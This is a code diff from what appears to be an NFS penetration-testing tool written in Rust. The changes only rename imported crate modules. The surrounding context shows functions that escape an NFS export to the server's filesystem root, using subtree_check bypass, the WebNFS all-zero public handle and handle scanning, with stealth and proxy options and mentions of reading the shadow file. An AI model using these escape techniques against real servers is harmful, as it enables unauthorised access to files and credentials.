@@ -20,7 +20,7 @@ use crate::proto::auth::{AuthSys, Credential};
 use crate::proto::nfs3::types::FileHandle;
 use crate::proto::nfs3::{Nfs3Client, PooledNfs3 as _};
 use crate::util::stealth::StealthConfig;
-use nfswolf_nfs3::FileType;
+use nfs_v3::FileType;
 
 /// Escape an export to the filesystem root via subtree_check bypass.
 ///
@@ -233,7 +233,7 @@ async fn try_webnfs_escape(host: &str, globals: &GlobalOpts) -> Option<EscapeOut
 
     // NFSv2: all-zero 32-byte handle is the WebNFS public handle (RFC 2054 sec. 5).
     let (_, _, v2_client) = make_v2_client_with_hostname(addr, "/", 0, 0, &[], stealth, globals.proxy.as_deref(), globals.nfs_port, &globals.hostname);
-    let public_v2 = nfswolf_nfs2::Nfs2FileHandle([0u8; 32]);
+    let public_v2 = nfs_v2::Nfs2FileHandle([0u8; 32]);
     if v2_client.lookup(&public_v2, traversal).await.is_ok() {
         tracing::info!("WebNFS public handle accepted on NFSv2 -- MOUNT bypass confirmed");
         return Some(EscapeOutcome::WebNfs { public_handle: FileHandle::from_bytes(&public_v2.0), version: "v2" });
@@ -511,7 +511,7 @@ fn print_escape_success(candidate: &EscapeResult, note: &str, host: &str) {
 /// NFSv2 has no BADHANDLE oracle (all rejections are NFSERR_STALE per RFC 1094)
 /// and handles are fixed 32 bytes. No post-escape shadow read (v2 has no ACCESS).
 async fn find_escape_v2(host: &str, export: &str, max_root_scan: u32, globals: &GlobalOpts) -> anyhow::Result<EscapeOutcome> {
-    use nfswolf_nfs2::wire::{FType, Nfs2FileHandle};
+    use nfs_v2::wire::{FType, Nfs2FileHandle};
 
     let addr = parse_addr_with_port(host, globals.nfs_port)?;
     let mc = make_mount_client(globals);
@@ -544,7 +544,7 @@ async fn find_escape_v2(host: &str, export: &str, max_root_scan: u32, globals: &
             Ok(a) if a.ftype == FType::Directory => {
                 return Ok(EscapeOutcome::Success { candidate: candidate.clone(), note: "verified (NFSv2)".to_owned() });
             },
-            Err(e) if matches!(e.status(), Some(nfswolf_nfs2::Nfs2Stat::Stale)) => {
+            Err(e) if matches!(e.status(), Some(nfs_v2::Nfs2Stat::Stale)) => {
                 found_stale = true;
             },
             _ => {},
@@ -559,7 +559,7 @@ async fn find_escape_v2(host: &str, export: &str, max_root_scan: u32, globals: &
             Ok(a) if a.ftype == FType::Directory => {
                 return Ok(EscapeOutcome::Success { candidate, note: "found via scan (NFSv2)".to_owned() });
             },
-            Err(e) if matches!(e.status(), Some(nfswolf_nfs2::Nfs2Stat::Stale)) => {
+            Err(e) if matches!(e.status(), Some(nfs_v2::Nfs2Stat::Stale)) => {
                 found_stale = true;
             },
             _ => {},
@@ -577,7 +577,7 @@ async fn find_escape_v2(host: &str, export: &str, max_root_scan: u32, globals: &
             Ok(a) if a.ftype == FType::Directory => {
                 return Ok(EscapeOutcome::Success { candidate: candidate.clone(), note: "subvolume (verified, NFSv2)".to_owned() });
             },
-            Err(e) if matches!(e.status(), Some(nfswolf_nfs2::Nfs2Stat::Stale)) => {
+            Err(e) if matches!(e.status(), Some(nfs_v2::Nfs2Stat::Stale)) => {
                 found_stale = true;
             },
             _ => {},
